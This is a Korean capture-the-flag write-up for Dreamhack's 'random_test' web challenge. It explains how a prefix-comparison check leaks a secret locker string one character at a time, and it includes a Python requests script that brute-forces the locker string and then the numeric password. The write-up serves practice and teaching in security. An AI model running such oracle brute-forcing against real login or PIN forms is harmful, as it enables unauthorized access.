---
ctf_name: "Dreamhack"
challenge_name: "random_test"
category: "web"
difficulty: "easy"
author: "sihyunkimm"
date: "2026-08-01"
---

# random_test

## 문제 설명

새 학기를 맞아 드림이에게 사물함이 배정되었습니다. 하지만 기억력이 안 좋은 드림이는 사물함 번호와 자물쇠 비밀번호를 모두 잊어버리고 말았어요... 드림이를 위해 사물함 번호와 자물쇠 비밀번호를 알아내 주세요!

사물함 번호는 알파벳 소문자 혹은 숫자를 포함하는 4자리 랜덤 문자열이고, 비밀번호는 100 이상 200 이하의 랜덤 정수입니다. 두 값을 맞게 입력하면 플래그가 출력됩니다. 플래그는 `FLAG` 변수에 있습니다.

## 풀이

### 분석

서버는 실행될 때 알파벳 소문자와 숫자로 이루어진 4자리 사물함 번호 `rand_str`과 `100` 이상 `200` 이하의 비밀번호 `rand_num`을 생성한다.

```python
rand_str = ""
alphanumeric = string.ascii_lowercase + string.digits
for i in range(4):
    rand_str += str(random.choice(alphanumeric))

rand_num = random.randint(100, 200)
```

사용자가 제출한 사물함 번호와 비밀번호를 검사하는 부분은 다음과 같다.

```python
if locker_num != "" and rand_str[0:len(locker_num)] == locker_num:
    if locker_num == rand_str and password == str(rand_num):
        return render_template("index.html", result = "FLAG:" + FLAG)
    return render_template("index.html", result = "Good")
else:
    return render_template("index.html", result = "Wrong!")
```

입력한 `locker_num`이 전체 사물함 번호와 같은지를 곧바로 검사하지 않고, `rand_str[0:len(locker_num)]`과 비교한다. 따라서 `locker_num`이 올바른 앞부분이면 `Good`, 그렇지 않으면 `Wrong!`이 반환된다.

예를 들어 실제 사물함 번호가 `a1b2`라면 `a`, `a1`, `a1b`, `a1b2`를 입력했을 때 모두 `Good`이 반환된다. 이 응답 차이를 이용하면 한 번에 한 글자씩 알아낼 수 있다.

### 취약점

사물함 번호의 일부만 일치해도 서버가 `Good`이라는 별도의 응답을 반환한다. 이 응답을 오라클로 사용해 각 자리의 후보를 순서대로 시도하면 전체 조합을 대입하지 않고도 올바른 접두사를 한 글자씩 확장할 수 있다.

### 익스플로잇

먼저 각 자리에서 `a`부터 `z`, `0`부터 `9`까지 차례로 대입한다. 응답에 `Good`이 포함되면 현재까지 만든 문자열이 올바른 접두사이므로 다음 자리로 넘어간다.

4자리 사물함 번호를 모두 구한 뒤에는 비밀번호를 `100`부터 `200`까지 요청한다. 두 값이 모두 맞으면 응답에 `FLAG`가 포함되므로 이를 출력한다.

```python
import requests
import string

print("doing")

alphanumeric = string.ascii_lowercase + string.digits
l_num = []
pw = ""

URL = "url here"

for i in range(4):
    for ch in alphanumeric:
        if ch == "a":
            l_num.append(ch)
        else:
            l_num[i] = ch

        r = requests.post(
            URL,
            data={"locker_num": "".join(l_num), "password": pw}
        )

        if "Good" in r.text:
            break
        elif "Wrong" in r.text:
            pass
        else:
            print("unexpected response")

for num in range(100, 201):
    pw = str(num)

    r = requests.post(
        URL,
        data={"locker_num": "".join(l_num), "password": pw}
    )

    if "FLAG" in r.text:
        print(r.text)
```

## 플래그

```text
DH{REDACTED}
```

## 배운 점

- `requests` 라이브러리를 이용해 HTTP 요청을 자동화하는 방법을 익혔다.
